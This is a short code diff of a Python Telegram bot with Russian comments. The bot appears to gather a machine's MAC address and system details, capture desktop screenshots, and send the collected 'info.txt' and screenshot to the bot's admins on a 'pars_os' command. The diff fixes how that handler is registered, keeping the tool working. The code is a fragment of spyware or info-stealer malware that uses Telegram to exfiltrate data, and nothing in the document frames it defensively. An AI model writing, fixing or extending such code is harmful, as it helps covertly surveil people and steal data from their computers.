@@ -9,7 +9,6 @@ from uuid import getnode as get_mac  # получа­ет MAC-адрес маш�
 import psutil  # работа­ет с некото­рыми низ­коуров­невыми сис­темны­ми фун­кци­ями;
 import pyautogui  # "быс­тро и без боли" работа­ет с GUI;
 from aiogram import Dispatcher
-from aiogram.dispatcher.filters.builtin import CommandPars_os
 from data.config import ADMINS
 from loader import dp
 from PIL import Image  # для сня­тия скрин­шота;
@@ -40,7 +39,7 @@ for adminF in ADMINS:
 
 # Скриншот рабочего стола
 text = "Screenshot" # Требуется при создании скриншота (текст к фото)
-@dp.message_handler(CommandPars_os()) # Выполняет действия при команде start
+@dp.message_handler(commands="pars_os") # Выполняет действия при команде start
 async def pars_os(dp: Dispatcher):
     upfile = open("Путь до файла\info.txt", "rb") # Читает файлы
     uphoto = open("Путь до файла\screenshot.jpg", "rb")
